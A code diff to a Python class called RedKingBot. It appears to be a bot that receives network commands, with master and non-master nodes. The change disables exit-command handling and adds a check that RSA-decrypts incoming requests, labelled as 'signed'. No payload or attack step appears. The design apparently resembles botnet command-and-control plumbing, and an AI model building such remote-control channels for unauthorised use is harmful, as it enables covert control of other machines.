@@ -82,24 +82,58 @@ class RedKingBot:
             if len(request) == 0:
                 bad_requests += 1
                 if bad_requests > 3:
-                    # print_error(f"Closing connection to {c_host}")
                     break
                 continue
-            if request in exit_commands:
-                print_info(f"Received exit command from {c_host}")
-                writer.close()
-                await writer.wait_closed()
-                # cancel the server coroutine
-                self.server.close()
-                await self.server.wait_closed()
-            else:
-                bad_requests = 0
-                # await self.handle_request(request, reader, writer)
-                await self.handle_request(request, writer)
+            # if request in exit_commands:
+            #    print_info(f"Received exit command from {c_host}")
+            #    writer.close()
+            #    await writer.wait_closed()
+            #    # cancel the server coroutine
+            #    self.server.close()
+            #    await self.server.wait_closed()
+            # else:
+            bad_requests = 0
+            await self.handle_request(request, writer)
         writer.close()
         await writer.wait_closed()
 
-    # async def handle_request(self, request, reader, writer):
+    def check_if_signed_request(self, request):
+        if not request:
+            print_error("No request received")
+            return None
+        if len(request) == 0:
+            print_error("Empty request")
+            return None
+        # at this point, we can assume the request is not empty
+        # so we can attempt to decode it the same way the AES key gets decoded
+        encrypted_request = None
+        try:
+            encrypted_request = base64.b64decode(request)
+        except Exception as e:
+            print_error(f"Error decoding request: {e}")
+            return None
+        if not encrypted_request:
+            print_error("No encrypted request")
+            return None
+        decrypted_request = None
+        try:
+            decrypted_request = rsa.decrypt(encrypted_request, self.priv)
+        except Exception as e:
+            print_error(f"Error decrypting request: {e}")
+            return None
+        if not decrypted_request:
+            print_error("No decrypted request")
+            return None
+        try:
+            decrypted_request = decrypted_request.decode("utf-8")
+        except Exception as e:
+            print_error(f"Error decoding decrypted request: {e}")
+            return None
+        if not decrypted_request:
+            print_error("No decoded request")
+            return None
+        return decrypted_request
+
     async def handle_request(self, request, writer):
         if not writer:
             print_error("No writer received")
@@ -107,14 +141,21 @@ class RedKingBot:
         if not request:
             print_error("No request received")
             return
-        # if request == "init":
-        #    print_info(f"{self.crypto}")
-        #    return
-        command_parts = request.split(" ")
-        if not command_parts:
-            print_error("No command parts")
+
+        # check if the request is signed
+        if not self.is_master:
+            signed_request = self.check_if_signed_request(request)
+            if not signed_request:
+                print_error("Invalid signed request")
+                return
+            print_error("Unhandled signed request received")
             return
-        await self.handle_command(command_parts, writer)
+        elif self.is_master:
+            command_parts = request.split(" ")
+            if not command_parts:
+                print_error("No command parts")
+                return
+            await self.handle_command(command_parts, writer)
 
     async def handle_command(self, cmd_parts, writer):
         cmd = cmd_parts[0]
